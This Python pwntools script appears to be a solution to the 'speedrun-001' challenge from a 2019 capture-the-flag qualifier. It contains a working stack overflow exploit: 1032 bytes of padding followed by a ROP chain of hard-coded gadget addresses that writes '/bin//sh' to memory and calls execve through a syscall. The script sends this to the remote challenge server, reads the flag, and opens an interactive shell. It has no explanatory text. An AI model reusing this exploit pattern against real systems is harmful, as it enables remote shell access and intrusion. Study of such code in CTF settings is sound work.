from pwn import * 
from struct import pack

#r = process("./speedrun-001")
r = remote("speedrun-001.quals2019.oooverflow.io", 31337)

payload = 'A' * (1024 + 8)

p = ""
p += pack('<Q', 0x00000000004101f3) # pop rsi ; ret
p += pack('<Q', 0x00000000006b90e0) # @ .data
p += pack('<Q', 0x0000000000415664) # pop rax ; ret
p += '/bin//sh'
p += pack('<Q', 0x000000000047f471) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x00000000004101f3) # pop rsi ; ret
p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
p += pack('<Q', 0x0000000000444bc0) # xor rax, rax ; ret
p += pack('<Q', 0x000000000047f471) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000400686) # pop rdi ; ret
p += pack('<Q', 0x00000000006b90e0) # @ .data
p += pack('<Q', 0x00000000004101f3) # pop rsi ; ret
p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
p += pack('<Q', 0x00000000004498b5) # pop rdx ; ret
p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
p += pack('<Q', 0x0000000000444bc0) # xor rax, rax ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474e65) # syscall ; ret

r.sendline(payload + p)
r.sendline("ls flag")
r.recvuntil("flag\n")

r.sendline("cat flag/flag")

r.interactive()
